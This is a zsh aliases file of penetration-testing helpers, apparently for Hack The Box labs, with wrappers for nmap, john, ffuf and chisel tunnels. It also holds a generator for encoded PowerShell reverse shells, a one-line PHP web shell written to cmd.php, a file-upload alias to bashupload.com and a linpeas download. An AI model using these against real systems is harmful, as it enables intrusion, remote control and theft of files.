# Misc
list_ips() {
  ip a show scope global | awk '/^[0-9]+:/ { sub(/:/,"",$2); iface=$2 } /^[[:space:]]*inet / { split($2, a, "/"); print "[\033[96m" iface"\033[0m] "a[1] }'
}

ls_pwd() {
  echo -e "[\e[96m`pwd`\e[0m]\e[34m" && ls && echo -en "\e[0m"
}

mkdir_cd() {
  mkdir $1 && cd $_
}

alias www="list_ips && ls_pwd && sudo python3 -m http.server 80"
alias tun0="ifconfig tun0 | grep 'inet ' | cut -d' ' -f10 | tr -d '\n' | xclip -sel clip"

# seclist_path
get_seclists_dir() {
  local dir
    if [ -d "/opt/seclists" ]; then
        dir="/opt/seclists"
    elif [ -d "/usr/share/seclists" ]; then
        dir="/usr/share/seclists"
    elif [ -n "$SECLISTS_PATH" ]; then
        dir="$SECLISTS_PATH"
    else
        echo "Error: Could not find SecLists directory. Please set SECLISTS_PATH environment variable or install SecLists in a standard location." >&2
        return 1
    fi
    echo $dir
    return 0
}


# Hashcracking
rock_john() {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: rock_john wordlist (options)"
    else
      john "${@}" --wordlist=/usr/share/wordlists/rockyou.txt
  fi
}

# Portscanning
nmap_default () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_default ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sCV -T4 --min-rate 10000 "${@}" -v -oA nmap/tcp_default
  fi
}

nmap_udp () {
  if [ $# -eq 0 ]
    then
      echo "[i] Usage: nmap_udp ip (options)"
    else
      [ ! -d "./nmap" ] && echo "[i] Creating $(pwd)/nmap..." && mkdir nmap
      sudo nmap -sUCV -T4 --min-rate 10000 "${@}" -v -oA nmap/udp_default
  fi
}

# Reverse shells

gen_ps_rev () {
  if [ "$#" -ne 2 ]; 
    then
      echo "[i] Usage: gen_ps_rev ip port"
    else
      SHELL=`cat ~/zsh-aliases/shells/ps_rev.txt | sed s/x.x.x.x/$1/g | sed s/yyyy/$2/g | iconv -f utf8 -t utf16le | base64 -w 0`
      echo "powershell -ec $SHELL" | xclip -sel clip
  fi
}


# TTY upgrades
py_tty_upgrade () {
  echo "py_tty_upgrade is deprecated, calling uptty instead..."
  uptty
}
py3_tty_upgrade () {
  echo "py3_tty_upgrade is deprecated, calling uptty instead..."
  uptty
}
uptty () {
  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
}
alias script_tty_upgrade="echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip"
alias tty_fix="stty raw -echo; fg; reset"
alias tty_conf="stty -a | sed 's/;//g' | head -n 1 | sed 's/.*baud /stty /g;s/line.*//g' | xclip -sel clip"

# Ffuf vhost
vhost() {
    if [ "$#" -lt 1 ]; then
        echo "[i] Usage: vhost <domain> (extra arguments)"
        return 1
    fi

    local seclists_dir
    seclists_dir=$(get_seclists_dir)
    local exit_status=$?
    if [[ $exit_status -ne 0 ]]; then
        return 1
    fi

    local url=$1
    # Default to http if no protocol specified, but allow optional specifying of the protocol
    # So we can also use it against HTTPS
    if [[ ! "$url" =~ ^https?:// ]]; then
        url="http://$url"
    fi

    local wordlist="$seclists_dir/Discovery/DNS/bitquark-subdomains-top100000.txt"
    ffuf -H "Host: FUZZ.$1" -u $url -w "$wordlist" "${@:2}"
}

fuzz_dir() {
    if [ "$#" -lt 1 ]; then
        echo "[i] Usage: fuzz_dir <url> [-w <wordlist>] [ffuf options]"
        return 1
    fi

    local url="$1"
    shift

    local seclists_dir
    seclists_dir=$(get_seclists_dir)
    local exit_status=$?
    if [[ $exit_status -ne 0 ]]; then
        return 1
    fi

    local default_wordlist="$seclists_dir/Discovery/Web-Content/raft-large-directories.txt"
    local wordlist="$default_wordlist"
    local ffuf_args=()

    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -w)
                wordlist="$2"
                shift 2
                ;;
            *)
                ffuf_args+=("$1")
                shift
                ;;
        esac
    done

    ffuf -u "$url/FUZZ" -w "$wordlist" -e .php,.asp,.txt,.php.old,.html,.php.bak,.bak,.aspx "${ffuf_args[@]}"
}
# Chisel
chisel_socks() {
        if [ "$#" -ne 2 ];
        then
          echo "[i] Usage: chisel_socks <ip> <server_port>"
        else
          echo "[+] copied chisel client -v $1:$2 R:socks in clipboard"
          echo "./chisel client -v $1:$2 R:socks" | xclip -sel c
          ~/zsh-aliases/tools/chisel server -v -p $2 --reverse
        fi
}

chisel_forward() {
    if [ "$#" -ne 4 ]; then
        echo "[i] Usage: chisel_remote <local_ip> <local_port> <remote_ip> <remote_port>"
    else
        echo "./chisel client $1:8888 R:$2:$3:$4" | xclip -sel clip
        echo "[+] Copied to clipboard: ./chisel client $1:8888 R:$2:$3:$4"
        echo "[+] Run this on the target machine"
        ~/zsh-aliases/tools/chisel server -p 8888 --reverse
    fi
}


# Hosts
addhost() {
    if [ "$#" -ne 2 ]; then
      echo "[i] Usage: addhost <ip> <hostname>"
      return 1
    fi

    ip="$1"
    hostname="$2"
    if grep -q "^$ip" /etc/hosts; then
      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
    else
      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
    fi

    grep "^$ip" /etc/hosts
}


# Other stuff
alias start_htb="python3 ~/zsh-aliases/start_htb.py"
alias linpeas="curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -s --output lin.sh"
alias upload='curl bashupload.com -T "${@}"'
alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] wrote <?=\`\$_GET[0]\`?> in cmd.php"'
alias burl='curl -x http://127.0.0.1:8080/ -k'

# Path fix
export PATH=~/zsh-aliases/shells/:$PATH
